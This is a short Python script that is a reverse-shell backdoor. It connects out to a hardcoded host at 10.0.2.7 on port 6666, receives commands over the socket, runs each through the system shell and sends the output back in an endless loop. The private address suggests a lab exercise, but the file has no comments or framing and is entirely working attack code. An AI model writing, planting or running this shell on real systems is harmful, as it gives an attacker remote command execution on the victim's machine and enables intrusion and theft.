#!/usr/bin/env python

import socket
import subprocess

HOST = "10.0.2.7"
PORT = 6666


def system_command(command):
    return subprocess.check_output(command, shell=True)


reverseConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
reverseConnection.connect((HOST, PORT))


while True:
    command = reverseConnection.recv(1024).decode("utf-8", "ignore")
    command_result = system_command(command)
    reverseConnection.send(command_result)

reverseConnection.close()

